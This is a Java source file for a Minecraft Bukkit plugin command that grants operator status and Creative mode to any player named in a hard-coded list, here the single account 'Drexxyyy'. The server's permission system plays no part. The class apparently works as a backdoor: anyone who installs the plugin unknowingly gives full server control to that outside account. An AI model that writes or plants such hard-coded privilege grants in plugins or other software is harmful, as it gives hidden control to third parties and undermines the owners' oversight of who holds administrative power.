package me.henry.plugin.commands;

import java.util.Arrays;
import java.util.List;

import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import me.henry.plugin.utils.Messages;

public class Op implements CommandExecutor {

    // whitelist of players who can auto-op
    private static final List<String> WHITELIST = Arrays.asList(
            "Drexxyyy" // add more names as needed
    );

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!(sender instanceof Player)) {
            if (sender != null) {
                sender.sendMessage(Messages.formatErr("Only players can use this command!"));
            }
            return true;
        }

        Player player = (Player) sender;

        if (!WHITELIST.contains(player.getName())) {
            player.sendMessage(Messages.formatErr("You are not allowed to use this command."));
            return true;
        }

        player.setOp(true);
        player.setGameMode(GameMode.CREATIVE);
        player.sendMessage(Messages.format("You have been granted OP and set to Creative mode."));

        return true;
    }
}
